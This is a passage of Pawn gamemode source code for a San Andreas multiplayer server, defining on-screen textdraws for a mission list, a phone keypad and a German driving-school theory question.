	PlayerTextDrawSetProportional(playerid,Missionen[playerid][27], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][27], 1);
	PlayerTextDrawUseBox(playerid,Missionen[playerid][27], 1);
	PlayerTextDrawBoxColor(playerid,Missionen[playerid][27], 255);
	PlayerTextDrawTextSize(playerid,Missionen[playerid][27], 7.000000, 9.000000);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][27], 0);

	Missionen[playerid][28] = CreatePlayerTextDraw(playerid,41.000000, 294.000000, "- Armybase einbruch");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][28], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][28], 2);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][28], 0.139999, 0.899999);
	PlayerTextDrawColor(playerid,Missionen[playerid][28], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][28], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][28], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][28], 0);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][28], 0);

	Missionen[playerid][29] = CreatePlayerTextDraw(playerid,115.000000, 294.000000, "ld_chat:thumbdn");
	PlayerTextDrawBackgroundColor(playerid,Missionen[playerid][29], 255);
	PlayerTextDrawFont(playerid,Missionen[playerid][29], 4);
	PlayerTextDrawLetterSize(playerid,Missionen[playerid][29], 0.159997, 5.299999);
	PlayerTextDrawColor(playerid,Missionen[playerid][29], -1);
	PlayerTextDrawSetOutline(playerid,Missionen[playerid][29], 0);
	PlayerTextDrawSetProportional(playerid,Missionen[playerid][29], 1);
	PlayerTextDrawSetShadow(playerid,Missionen[playerid][29], 1);
	PlayerTextDrawUseBox(playerid,Missionen[playerid][29], 1);
	PlayerTextDrawBoxColor(playerid,Missionen[playerid][29], 255);
	PlayerTextDrawTextSize(playerid,Missionen[playerid][29], 7.000000, 9.000000);
	PlayerTextDrawSetSelectable(playerid,Missionen[playerid][29], 0);
////////



	Handy[playerid][0] = CreatePlayerTextDraw(playerid,621.000000, 287.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][0], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][0], 1);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][0], 0.500000, 15.200011);
	PlayerTextDrawColor(playerid,Handy[playerid][0], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][0], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][0], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][0], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][0], 255);
	PlayerTextDrawTextSize(playerid,Handy[playerid][0], 540.000000, -3.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][0], 0);
	Handy[playerid][1] = CreatePlayerTextDraw(playerid,570.000000, 406.000000, "ld_beat:cring");
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][1], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][1], 4);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][1], 0.500000, 14.800009);
	PlayerTextDrawColor(playerid,Handy[playerid][1], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][1], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][1], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][1], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][1], 255);
	PlayerTextDrawTextSize(playerid,Handy[playerid][1], 20.000000, 20.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][1], 0);
	Handy[playerid][2] = CreatePlayerTextDraw(playerid,617.000000, 293.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][2], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][2], 1);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][2], 0.500000, 12.200007);
	PlayerTextDrawColor(playerid,Handy[playerid][2], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][2], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][2], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][2], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][2], -1);
	PlayerTextDrawTextSize(playerid,Handy[playerid][2], 545.000000, -3.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][2], 0);
	Handy[playerid][3] = CreatePlayerTextDraw(playerid,617.000000, 336.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][3], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][3], 1);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][3], 0.500000, 7.700003);
	PlayerTextDrawColor(playerid,Handy[playerid][3], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][3], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][3], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][3], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][3], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][3], 1852731135);
	PlayerTextDrawTextSize(playerid,Handy[playerid][3], 545.000000, -3.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][3], 0);
	Handy[playerid][4] = CreatePlayerTextDraw(playerid,617.000000, 293.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][4], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][4], 1);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][4], 0.500000, 0.600004);
	PlayerTextDrawColor(playerid,Handy[playerid][4], 16711935);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][4], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][4], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][4], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][4], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][4], 1852731135);
	PlayerTextDrawTextSize(playerid,Handy[playerid][4], 545.000000, -3.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][4], 0);
	Handy[playerid][5] = CreatePlayerTextDraw(playerid,551.000000, 297.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][5], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][5], 1);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][5], 0.500000, -0.100000);
	PlayerTextDrawColor(playerid,Handy[playerid][5], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][5], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][5], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][5], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][5], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][5], -1);
	PlayerTextDrawTextSize(playerid,Handy[playerid][5], 547.000000, 0.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][5], 0);
	Handy[playerid][6] = CreatePlayerTextDraw(playerid,553.000000, 296.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][6], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][6], 1);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][6], 0.500000, 0.000000);
	PlayerTextDrawColor(playerid,Handy[playerid][6], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][6], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][6], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][6], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][6], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][6], -1);
	PlayerTextDrawTextSize(playerid,Handy[playerid][6], 549.000000, 0.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][6], 0);
	Handy[playerid][7] = CreatePlayerTextDraw(playerid,555.000000, 295.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][7], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][7], 1);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][7], 0.500000, 0.100000);
	PlayerTextDrawColor(playerid,Handy[playerid][7], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][7], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][7], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][7], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][7], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][7], -1);
	PlayerTextDrawTextSize(playerid,Handy[playerid][7], 551.000000, 0.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][7], 0);
	Handy[playerid][8] = CreatePlayerTextDraw(playerid,555.000000, 291.000000, "3G");
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][8], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][8], 1);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][8], 0.210000, 0.800000);
	PlayerTextDrawColor(playerid,Handy[playerid][8], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][8], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][8], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][8], 0);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][8], 0);
	Handy[playerid][9] = CreatePlayerTextDraw(playerid,570.000000, 291.000000, "13:15");
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][9], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][9], 1);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][9], 0.210000, 0.800000);
	PlayerTextDrawColor(playerid,Handy[playerid][9], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][9], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][9], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][9], 0);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][9], 0);
	Handy[playerid][10] = CreatePlayerTextDraw(playerid,614.000000, 295.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][10], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][10], 1);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][10], 0.210000, 0.100000);
	PlayerTextDrawColor(playerid,Handy[playerid][10], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][10], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][10], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][10], 0);
	PlayerTextDrawUseBox(playerid,Handy[playerid][10], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][10], -65281);
	PlayerTextDrawTextSize(playerid,Handy[playerid][10], 603.000000, 0.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][10], 0);
	Handy[playerid][11] = CreatePlayerTextDraw(playerid,544.000000, 313.000000, " ");//549
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][11], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][11], 1);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][11], 0.500000, 1.000000);
	PlayerTextDrawColor(playerid,Handy[playerid][11], 255);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][11], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][11], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][11], 0);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][11], 0);
	Handy[playerid][12] = CreatePlayerTextDraw(playerid,558.000000, 337.000000, "1");
	PlayerTextDrawAlignment(playerid,Handy[playerid][12], 2);
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][12], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][12], 3);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][12], 0.549999, 1.500000);
	PlayerTextDrawColor(playerid,Handy[playerid][12], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][12], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][12], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][12], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][12], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][12], 255);
	PlayerTextDrawTextSize(playerid,Handy[playerid][12], 14.000000, 17.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][12], 1);
	Handy[playerid][13] = CreatePlayerTextDraw(playerid,580.000000, 337.000000, "2");
	PlayerTextDrawAlignment(playerid,Handy[playerid][13], 2);
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][13], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][13], 3);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][13], 0.549999, 1.500000);
	PlayerTextDrawColor(playerid,Handy[playerid][13], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][13], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][13], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][13], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][13], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][13], 255);
	PlayerTextDrawTextSize(playerid,Handy[playerid][13], 12.000000, 17.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][13], 1);
	Handy[playerid][14] = CreatePlayerTextDraw(playerid,603.000000, 337.000000, "3");
	PlayerTextDrawAlignment(playerid,Handy[playerid][14], 2);
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][14], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][14], 3);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][14], 0.549999, 1.500000);
	PlayerTextDrawColor(playerid,Handy[playerid][14], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][14], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][14], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][14], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][14], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][14], 255);
	PlayerTextDrawTextSize(playerid,Handy[playerid][14], 10.000000, 18.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][14], 1);
	Handy[playerid][15] = CreatePlayerTextDraw(playerid,558.000000, 355.000000, "4");
	PlayerTextDrawAlignment(playerid,Handy[playerid][15], 2);
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][15], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][15], 3);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][15], 0.549999, 1.500000);
	PlayerTextDrawColor(playerid,Handy[playerid][15], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][15], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][15], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][15], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][15], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][15], 255);
	PlayerTextDrawTextSize(playerid,Handy[playerid][15], 14.000000, 17.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][15], 1);
	Handy[playerid][16] = CreatePlayerTextDraw(playerid,580.000000, 355.000000, "5");
	PlayerTextDrawAlignment(playerid,Handy[playerid][16], 2);
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][16], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][16], 3);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][16], 0.549999, 1.500000);
	PlayerTextDrawColor(playerid,Handy[playerid][16], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][16], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][16], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][16], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][16], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][16], 255);
	PlayerTextDrawTextSize(playerid,Handy[playerid][16], 14.000000, 17.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][16], 1);
	Handy[playerid][17] = CreatePlayerTextDraw(playerid,603.000000, 355.000000, "6");
	PlayerTextDrawAlignment(playerid,Handy[playerid][17], 2);
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][17], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][17], 3);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][17], 0.549999, 1.500000);
	PlayerTextDrawColor(playerid,Handy[playerid][17], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][17], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][17], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][17], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][17], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][17], 255);
	PlayerTextDrawTextSize(playerid,Handy[playerid][17], 14.000000, 17.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][17], 1);
	Handy[playerid][18] = CreatePlayerTextDraw(playerid,558.000000, 373.000000, "7");
	PlayerTextDrawAlignment(playerid,Handy[playerid][18], 2);
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][18], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][18], 3);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][18], 0.549999, 1.500000);
	PlayerTextDrawColor(playerid,Handy[playerid][18], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][18], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][18], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][18], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][18], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][18], 255);
	PlayerTextDrawTextSize(playerid,Handy[playerid][18], 14.000000, 17.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][18], 1);
	Handy[playerid][19] = CreatePlayerTextDraw(playerid,580.000000, 373.000000, "8");
	PlayerTextDrawAlignment(playerid,Handy[playerid][19], 2);
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][19], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][19], 3);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][19], 0.549999, 1.500000);
	PlayerTextDrawColor(playerid,Handy[playerid][19], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][19], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][19], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][19], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][19], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][19], 255);
	PlayerTextDrawTextSize(playerid,Handy[playerid][19], 14.000000, 17.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][19], 1);
	Handy[playerid][20] = CreatePlayerTextDraw(playerid,603.000000, 373.000000, "9");
	PlayerTextDrawAlignment(playerid,Handy[playerid][20], 2);
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][20], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][20], 3);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][20], 0.549999, 1.500000);
	PlayerTextDrawColor(playerid,Handy[playerid][20], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][20], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][20], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][20], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][20], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][20], 255);
	PlayerTextDrawTextSize(playerid,Handy[playerid][20], 14.000000, 17.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][20], 1);
	Handy[playerid][21] = CreatePlayerTextDraw(playerid,603.000000, 391.000000, "_");
	PlayerTextDrawAlignment(playerid,Handy[playerid][21], 2);
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][21], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][21], 3);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][21], 0.549999, 1.500000);
	PlayerTextDrawColor(playerid,Handy[playerid][21], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][21], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][21], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][21], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][21], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][21], 255);
	PlayerTextDrawTextSize(playerid,Handy[playerid][21], 14.000000, 17.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][21], 1);
	Handy[playerid][22] = CreatePlayerTextDraw(playerid,580.000000, 391.000000, "0");
	PlayerTextDrawAlignment(playerid,Handy[playerid][22], 2);
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][22], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][22], 3);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][22], 0.549999, 1.500000);
	PlayerTextDrawColor(playerid,Handy[playerid][22], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][22], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][22], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][22], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][22], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][22], 255);
	PlayerTextDrawTextSize(playerid,Handy[playerid][22], 14.000000, 17.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][22], 1);
	Handy[playerid][23] = CreatePlayerTextDraw(playerid,558.000000, 391.000000, "_");
	PlayerTextDrawAlignment(playerid,Handy[playerid][23], 2);
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][23], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][23], 3);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][23], 0.549999, 1.500000);
	PlayerTextDrawColor(playerid,Handy[playerid][23], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][23], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][23], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][23], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][23], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][23], 255);
	PlayerTextDrawTextSize(playerid,Handy[playerid][23], 14.000000, 17.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][23], 1);
	Handy[playerid][24] = CreatePlayerTextDraw(playerid,606.000000, 296.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][24], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][24], 1);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][24], 0.500000, -0.100000);
	PlayerTextDrawColor(playerid,Handy[playerid][24], -1);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][24], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][24], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][24], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][24], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][24], -65281);
	PlayerTextDrawTextSize(playerid,Handy[playerid][24], 602.000000, 0.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][24], 0);
	Handy[playerid][25] = CreatePlayerTextDraw(playerid,596.000000, 392.000000, "ld_bum:blkdot");
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][25], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][25], 4);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][25], 0.500000, 0.299997);
	PlayerTextDrawColor(playerid,Handy[playerid][25], -16776961);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][25], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][25], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][25], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][25], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][25], -16776961);
	PlayerTextDrawTextSize(playerid,Handy[playerid][25], 14.000000, 11.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][25], 1);
	Handy[playerid][26] = CreatePlayerTextDraw(playerid,551.000000, 392.000000, "ld_bum:blkdot");
	PlayerTextDrawBackgroundColor(playerid,Handy[playerid][26], 255);
	PlayerTextDrawFont(playerid,Handy[playerid][26], 4);
	PlayerTextDrawLetterSize(playerid,Handy[playerid][26], 0.500000, 0.799998);
	PlayerTextDrawColor(playerid,Handy[playerid][26], 16711935);
	PlayerTextDrawSetOutline(playerid,Handy[playerid][26], 0);
	PlayerTextDrawSetProportional(playerid,Handy[playerid][26], 1);
	PlayerTextDrawSetShadow(playerid,Handy[playerid][26], 1);
	PlayerTextDrawUseBox(playerid,Handy[playerid][26], 1);
	PlayerTextDrawBoxColor(playerid,Handy[playerid][26], 16711935);
	PlayerTextDrawTextSize(playerid,Handy[playerid][26], 14.000000, 11.000000);
	PlayerTextDrawSetSelectable(playerid,Handy[playerid][26], 1);

	FahrschuleTheo[playerid][4] = CreatePlayerTextDraw(playerid,588.000000, 122.000000, "_");
	PlayerTextDrawBackgroundColor(playerid,FahrschuleTheo[playerid][4], 255);
	PlayerTextDrawFont(playerid,FahrschuleTheo[playerid][4], 1);
	PlayerTextDrawLetterSize(playerid,FahrschuleTheo[playerid][4], 0.589999, 11.899992);
	PlayerTextDrawColor(playerid,FahrschuleTheo[playerid][4], -1);
	PlayerTextDrawSetOutline(playerid,FahrschuleTheo[playerid][4], 0);
	PlayerTextDrawSetProportional(playerid,FahrschuleTheo[playerid][4], 1);
	PlayerTextDrawSetShadow(playerid,FahrschuleTheo[playerid][4], 1);
	PlayerTextDrawUseBox(playerid,FahrschuleTheo[playerid][4], 1);
	PlayerTextDrawBoxColor(playerid,FahrschuleTheo[playerid][4], 1515870975);
	PlayerTextDrawTextSize(playerid,FahrschuleTheo[playerid][4], 69.000000, 19.000000);
	FahrschuleTheo[playerid][5] = CreatePlayerTextDraw(playerid,588.000000, 143.000000, "_________________");
	PlayerTextDrawBackgroundColor(playerid,FahrschuleTheo[playerid][5], 255);
	PlayerTextDrawFont(playerid,FahrschuleTheo[playerid][5], 1);
	PlayerTextDrawLetterSize(playerid,FahrschuleTheo[playerid][5], 0.500000, -0.100000);
	PlayerTextDrawColor(playerid,FahrschuleTheo[playerid][5], -1);
	PlayerTextDrawSetOutline(playerid,FahrschuleTheo[playerid][5], 0);
	PlayerTextDrawSetProportional(playerid,FahrschuleTheo[playerid][5], 1);
	PlayerTextDrawSetShadow(playerid,FahrschuleTheo[playerid][5], 1);
	PlayerTextDrawUseBox(playerid,FahrschuleTheo[playerid][5], 1);
	PlayerTextDrawBoxColor(playerid,FahrschuleTheo[playerid][5], 255);
	PlayerTextDrawTextSize(playerid,FahrschuleTheo[playerid][5], 69.000000, -3.000000);
	FahrschuleTheo[playerid][0] = CreatePlayerTextDraw(playerid,76.000000, 121.000000, "Sie wollen aus ihrer Hauseinfahrt ausfahren, haben Sie Vorrang wenn sich ein Fahrzeug von links nähern würde?");
	PlayerTextDrawBackgroundColor(playerid,FahrschuleTheo[playerid][0], 255);
	PlayerTextDrawFont(playerid,FahrschuleTheo[playerid][0], 1);
	PlayerTextDrawLetterSize(playerid,FahrschuleTheo[playerid][0], 0.239999, 2.000000);
	PlayerTextDrawColor(playerid,FahrschuleTheo[playerid][0], -1);
	PlayerTextDrawSetOutline(playerid,FahrschuleTheo[playerid][0], 1);
	PlayerTextDrawSetProportional(playerid,FahrschuleTheo[playerid][0], 1);
	FahrschuleTheo[playerid][1] = CreatePlayerTextDraw(playerid,76.000000, 156.000000, "A.: Ja, Aufgrund der Rechtsregel habe ich Vorrang");
	PlayerTextDrawBackgroundColor(playerid,FahrschuleTheo[playerid][1], 65535);
	PlayerTextDrawFont(playerid,FahrschuleTheo[playerid][1], 1);
	PlayerTextDrawLetterSize(playerid,FahrschuleTheo[playerid][1], 0.419999, 1.399999);
	PlayerTextDrawColor(playerid,FahrschuleTheo[playerid][1], -1);
	PlayerTextDrawSetOutline(playerid,FahrschuleTheo[playerid][1], 1);
	PlayerTextDrawSetProportional(playerid,FahrschuleTheo[playerid][1], 1);
	PlayerTextDrawSetSelectable(playerid,FahrschuleTheo[playerid][1],1);
	PlayerTextDrawUseBox(playerid,FahrschuleTheo[playerid][1], 1);
	PlayerTextDrawBoxColor(playerid,FahrschuleTheo[playerid][1], -256);
	PlayerTextDrawTextSize(playerid,FahrschuleTheo[playerid][1], 580.000000, 10.000000);
	FahrschuleTheo[playerid][2] = CreatePlayerTextDraw(playerid,76.000000, 178.000000, "B.: Nein, Aufgrund der Fließverkehrsregel habe ich Wartepflicht");
	PlayerTextDrawBackgroundColor(playerid,FahrschuleTheo[playerid][2], 65535);
	PlayerTextDrawFont(playerid,FahrschuleTheo[playerid][2], 1);
	PlayerTextDrawLetterSize(playerid,FahrschuleTheo[playerid][2], 0.419999, 1.399999);
	PlayerTextDrawColor(playerid,FahrschuleTheo[playerid][2], -1);
	PlayerTextDrawSetOutline(playerid,FahrschuleTheo[playerid][2], 1);
	PlayerTextDrawSetProportional(playerid,FahrschuleTheo[playerid][2], 1);
	PlayerTextDrawUseBox(playerid,FahrschuleTheo[playerid][2], 1);
	PlayerTextDrawBoxColor(playerid,FahrschuleTheo[playerid][2], -256);
	PlayerTextDrawTextSize(playerid,FahrschuleTheo[playerid][2], 583.000000, 10.000000);
